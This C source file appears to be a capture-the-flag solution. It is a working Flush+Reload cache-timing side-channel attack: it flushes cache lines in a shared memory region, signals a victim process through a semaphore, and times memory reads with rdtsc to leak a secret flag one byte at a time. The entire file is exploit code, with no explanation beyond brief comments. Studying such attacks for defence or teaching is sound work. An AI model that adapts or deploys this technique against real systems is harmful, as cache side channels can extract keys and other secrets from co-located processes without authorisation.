#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <x86intrin.h>
#include <stdint.h>

#define SHARED_MEMORY_BASE 0x1337000
#define CACHE_LINE_SIZE 0x1000
#define FLAG_LENGTH 21
#define CACHE_HIT_THRESHOLD 230

// Shared memory will be injected at this address
volatile char *shared_memory = (volatile char *)SHARED_MEMORY_BASE;
volatile sem_t *sem;
volatile int *index_ptr;

uint64_t measure_access_time(void *addr) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile char x = *(volatile char*)addr;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

void flush_cache_range() {
    // Flush the range where flag bytes could be accessed
    for (int i = 0; i < 256; i++) {
        void *addr = (void*)(SHARED_MEMORY_BASE + 0x1000 + i * CACHE_LINE_SIZE);
        _mm_clflush(addr);
    }
    _mm_mfence();
}

char leak_flag_byte(int position) {
    char leaked_byte = 0;
    int max_hits = 0;
    int hits[256] = {0};
    
    // Set the index to the flag position we want to leak
    *index_ptr = position;
    
    // Repeat the measurement multiple times for reliability
    for (int attempt = 0; attempt < 1000; attempt++) {
        // Flush cache to ensure clean state
        flush_cache_range();
        
        // Signal the victim to perform the access
        sem_post((sem_t*)sem);
        
        // Small delay to let victim complete
        usleep(1);
        
        // Test all possible byte values in random order
        for (int i = 0; i < 256; i++) {
            int test_byte = (i * 167 + 13) & 0xFF;  // Mix up the order
            void *test_addr = (void*)(SHARED_MEMORY_BASE + 0x1000 + test_byte * CACHE_LINE_SIZE);
            
            uint64_t timing = measure_access_time(test_addr);
            
            if (timing < CACHE_HIT_THRESHOLD && test_byte >= 0x20 && test_byte < 0x7F) {
                hits[test_byte]++;
            }
        }
    }
    
    // Find the byte with most cache hits
    for (int i = 0x20; i < 0x7F; i++) {
        if (hits[i] > max_hits) {
            max_hits = hits[i];
            leaked_byte = i;
        }
    }
    
    printf("Position %d: '%c' (0x%02x) with %d hits\n", 
           position, leaked_byte, leaked_byte, max_hits);
    
    return leaked_byte;
}

int main() {
    printf("Starting side-channel attack...\n");
    
    // The semaphore is at the start of shared memory
    sem = (volatile sem_t*)shared_memory;
    
    // The index control is right after the semaphore
    index_ptr = (volatile int*)(shared_memory + sizeof(sem_t));
    
    // Initialize index
    *index_ptr = 0;
    
    printf("Shared memory at: %p\n", shared_memory);
    printf("Semaphore at: %p\n", sem);
    printf("Index pointer at: %p\n", index_ptr);
    
    char flag[FLAG_LENGTH + 1] = {0};
    
    // Leak each byte of the flag
    for (int i = 0; i < FLAG_LENGTH; i++) {
        flag[i] = leak_flag_byte(i);
        printf("Current flag: %s\n", flag);
    }
    
    printf("Final flag: %s\n", flag);
    
    return 0;
}
